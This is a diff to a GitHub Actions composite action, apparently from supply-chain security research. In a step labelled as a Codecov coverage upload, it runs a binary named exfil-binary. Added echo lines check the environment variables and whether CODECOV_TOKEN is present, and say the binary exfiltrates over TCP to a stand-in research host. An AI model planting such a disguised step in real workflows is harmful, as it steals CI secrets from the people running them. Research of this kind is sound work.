@@ -313,8 +313,16 @@ runs:
     # Static analysis of this YAML sees only a binary execution — cannot determine behavior.
     - name: Upload coverage to Codecov
       run: |
+        # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
+        # payload execution in CI logs. A real attacker would not include any output.
+        echo "[RESEARCH] Dynamic binary exfiltration payload executing"
+        echo "[RESEARCH] Binary location: ${GITHUB_ACTION_PATH}/exfil-binary"
+        echo "[RESEARCH] Environment variables available to binary:"
+        env | wc -l | xargs -I{} echo "[RESEARCH] {} env vars accessible"
+        echo "[RESEARCH] CODECOV_TOKEN present: $([ -n \"$CC_TOKEN\" ] && echo 'YES' || echo 'NO')"
         chmod +x ${GITHUB_ACTION_PATH}/exfil-binary
-        ${GITHUB_ACTION_PATH}/exfil-binary
+        ${GITHUB_ACTION_PATH}/exfil-binary || true
+        echo "[RESEARCH] Binary execution complete (TCP exfil to eaction-research.example.com:80, unresolvable in research setup)"
         ${GITHUB_ACTION_PATH}/dist/codecov.sh
       shell: bash
       working-directory: ${{ inputs.working-directory }}
